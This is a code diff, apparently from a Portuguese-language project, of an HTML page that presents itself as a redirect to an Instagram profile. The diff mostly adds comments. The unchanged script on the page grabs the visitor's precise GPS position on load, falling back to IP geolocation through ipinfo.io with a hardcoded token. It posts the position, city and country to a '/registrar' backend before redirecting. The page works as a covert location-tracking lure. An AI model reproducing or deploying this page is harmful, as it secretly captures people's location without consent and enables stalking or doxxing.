@@ -1,19 +1,24 @@
+<!-- Desenvolvido por Maicon Ferreira – 2025 -->
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <title>Localizando...</title>
+
     <script>
+        // Envia os dados de localização para o backend e redireciona para o Instagram - Maicon Ferreira
         function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
             fetch('/registrar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ lat, lon, precisa, city, region, country })
             }).finally(() => {
+                // Redirecionamento imediato após tentativa de envio - Maicon Ferreira
                 window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
             });
         }
 
+        // Tentativa de localização aproximada via IP usando ipinfo.io - Maicon Ferreira
         function tentarLocalizacaoPorIP() {
             fetch('https://ipinfo.io/json?token=848013f8df8279')
                 .then(res => res.json())
@@ -29,31 +34,32 @@
                     );
                 })
                 .catch(() => {
-                    // Em caso de erro, ainda redireciona
+                    // Em caso de falha, redireciona diretamente - Maicon Ferreira
                     window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
                 });
         }
 
+        // Ao carregar a página, tenta obter a geolocalização precisa do dispositivo - Maicon Ferreira
         window.onload = function () {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
                         const { latitude, longitude } = pos.coords;
-                        enviarLocalizacao(latitude, longitude, true);
+                        enviarLocalizacao(latitude, longitude, true); // GPS ativo - Maicon Ferreira
                     },
                     err => {
-                        console.warn("GPS falhou ou negado:", err);
-                        tentarLocalizacaoPorIP();
+                        console.warn("GPS falhou ou negado:", err); // Caso o usuário negue ou falhe - Maicon Ferreira
+                        tentarLocalizacaoPorIP(); // Fallback para localização por IP - Maicon Ferreira
                     },
-                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 } // Configurações do GPS - Maicon Ferreira
                 );
             } else {
-                tentarLocalizacaoPorIP();
+                tentarLocalizacaoPorIP(); // Se o navegador não suporta geolocalização - Maicon Ferreira
             }
         };
     </script>
 </head>
 <body>
-    <p>Redirecionando para o Instagram...</p>
+    <p>Redirecionando para o Instagram...</p> <!-- Mensagem visível rapidamente - Maicon Ferreira -->
 </body>
 </html>
